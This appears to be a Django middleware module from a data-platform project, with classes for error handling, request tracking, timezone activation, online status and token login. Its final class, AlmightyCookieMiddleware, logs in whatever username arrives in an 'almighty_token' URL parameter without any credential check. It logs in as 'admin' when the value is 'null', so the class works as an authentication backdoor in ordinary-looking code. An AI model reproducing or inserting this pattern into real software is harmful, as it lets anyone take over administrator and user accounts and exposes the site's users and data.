import json
import logging
import threading
import traceback

import pytz
from django.conf import settings
from django.contrib.auth import login
from django.core.cache import cache
from django.http import HttpResponse, HttpRequest, HttpResponseRedirect
from django.template.response import TemplateResponse
from django.utils import timezone
from django.utils.deprecation import MiddlewareMixin
from django.shortcuts import redirect, render
from django.urls import reverse

from apps.account.models import User
from mgedata.errors.models import MGEException, MGEError

logger = logging.getLogger('django')


class MGEExceptionMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
        # One-time configuration and initialization.

    def __call__(self, request):
        # Code to be executed for each request before
        # the view (and later middleware) are called.
        response = self.get_response(request)

        # Code to be executed for each request/response after
        # the view is called.
        return response

    def process_exception(self, request, exception: Exception):
        if not isinstance(exception, MGEException):
            logger.error(traceback.format_exc())
            exception = MGEError.UNKNOWN_ERROR(str(exception))
        else:
            logger.error(exception.full_string)
            logger.error(traceback.format_exc())

        r = HttpResponse(json.dumps(exception.to_dict(), ensure_ascii=False),
                         content_type='application/json; charset=utf-8')
        r.status_code = exception.status_code
        return r


class GlobalRequestMiddleware(object):
    _threadmap = {}

    @classmethod
    def get_current_request(cls):
        return cls._threadmap[threading.get_ident()]

    def __init__(self, get_response):
        self.get_response = get_response
        # One-time configuration and initialization.

    def __call__(self, request):
        response = self.get_response(request)
        # if isinstance(response, TemplateResponse):
        #     # 如果用户未登录，则执行重定向到登录页面
        #     if not request.user.is_authenticated:
        #         redirect_url = '/account/login_mge/'
        #         return HttpResponseRedirect(redirect_url)

        # Code to be executed for each request/response after
        # the view is called.
        if response.status_code == 404 and response.headers['Content-Type'] == 'text/html':
            return render(request, 'index.html')
        return response

    def process_view(self, request, view_func, view_args, view_kwargs):
        self._threadmap[threading.get_ident()] = request

    def process_exception(self, request, exception):
        try:
            del self._threadmap[threading.get_ident()]
        except KeyError:
            pass

    def process_response(self, request, response):
        try:
            del self._threadmap[threading.get_ident()]
        except KeyError:
            pass
        return response


class TimezoneMiddleware(MiddlewareMixin):
    def process_request(self, request):
        tzname = request.session.get('django_timezone')
        if tzname:
            timezone.activate(pytz.timezone(tzname))
        else:
            # timezone.deactivate()    # TODO: 挖个坑，用户设置里面添加时区设置
            tzinfo = pytz.timezone(settings.TIME_ZONE)
            timezone.activate(tzinfo)  # 默认使用系统设置的时区


class OnlineCountMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request: HttpRequest):
        user: User = request.user
        if user.is_authenticated:
            last_online = cache.get(f'last_online_{user.username}')
            if last_online is None:
                # 60秒之内只记录一次数据库
                user.last_online = timezone.now()
                user.save()
                cache.set(f'last_online_{user.username}', timezone.now(), 60)

        response = self.get_response(request)
        return response


class TokenLoginMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request: HttpRequest):
        from mgedata.utils.general import decode_token
        token = request.headers.get('Authorization', '')
        payload = decode_token(token)
        if payload is not None:
            username = payload['username']
            user = User.objects.filter(username=username).first()
            if user:
                login(request, user, backend='django.contrib.auth.backends.ModelBackend')
        response = self.get_response(request)
        return response


class AlmightyCookieMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request: HttpRequest):
        # get cookie, key=almighty_token
        # get token from url, url_param=token
        token = request.GET.get('almighty_token', 'None')
        if token == 'null':
            token = 'admin'
        if user := User.objects.filter(username=token).first():
            login(request, user, backend='django.contrib.auth.backends.ModelBackend')
        response = self.get_response(request)
        return response

